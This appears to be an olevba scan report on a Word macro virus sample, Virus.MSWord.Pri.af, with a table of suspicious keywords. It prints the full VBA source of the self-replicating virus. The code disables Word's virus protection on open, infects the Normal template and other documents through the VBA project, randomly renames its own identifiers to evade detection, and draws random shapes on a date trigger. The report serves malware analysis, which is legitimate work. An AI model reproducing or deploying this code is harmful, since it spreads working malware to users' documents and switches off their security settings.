olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pri.af-d8d8ca899e46b27d7ec6008d5cd7d2dc68167ddb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pri.af-d8d8ca899e46b27d7ec6008d5cd7d2dc68167ddb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For x = 1 To 10
ActiveDocument.Shapes.AddShape(msoShapePentagon, Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next x: End If
AB9936 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
GF290 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set GS3284 = ActiveDocument.VBProject.VBComponents.Item(1)
CV914 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set GS3284 = NormalTemplate.VBProject.VBComponents.Item(1)
GV570 = True
Call QS2060_KF351
ActiveDocument.Saved = True
End If
If GV570 <> True And CV914 <> True Then GoTo RK8293
If GV570 = True Then GS3284.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, AB9936 - 1) & vbCr & "Sub ViewVBCode" & vbCr & "End Sub")
If CV914 = True Then GS3284.CodeModule.AddFromString ("Private Sub Document_Open" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, GF290 - 3))
RK8293:
If GF290 <> 0 And AB9936 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub 'W97M/PSD ...porn star dreams? [(c)1998 ALT-F11 code hack]
Private Function QS2060_KF351()
On Error Resume Next
Randomize
Dim r1(1 To 14) As String
r1(1) = "NQ9115": r1(2) = "CA233": r1(3) = "FS1739": r1(4) = "SC7398": r1(5) = "KF351": r1(6) = "AB9936"
r1(7) = "GF290": r1(8) = "CV914":: r1(9) = "GS3284": r1(10) = "GV570": r1(11) = "RK8293": r1(12) = "QS2060": r1(13) = "LG6515": r1(14) = "JH6014"
For x = 1 To 14
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call KF351(a1, r1(x))
Next x
End Function 'VAMP v1.0 [thanks Vic!]
Private Function KF351(JH6014, LG6515 As String)
On Error Resume Next
Dim NQ9115 As Long: Dim CA233 As Long: Dim FS1739 As Long: Dim SC7398 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
NQ9115 = 1: CA233 = 1: FS1739 = .CountOfLines: SC7398 = Len(.Lines(.CountOfLines, 1))
Do While .Find(LG6515, NQ9115, CA233, FS1739, SC7398, True)
strline = .Lines(NQ9115, 1)
strline = Left(strline, CA233 - 1) & JH6014 & Mid(strline, SC7398)
.replaceline NQ9115, strline
NQ9115 = FS1739 + 1: CA233 = 1:
FS1739 = .CountOfLines
SC7398 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

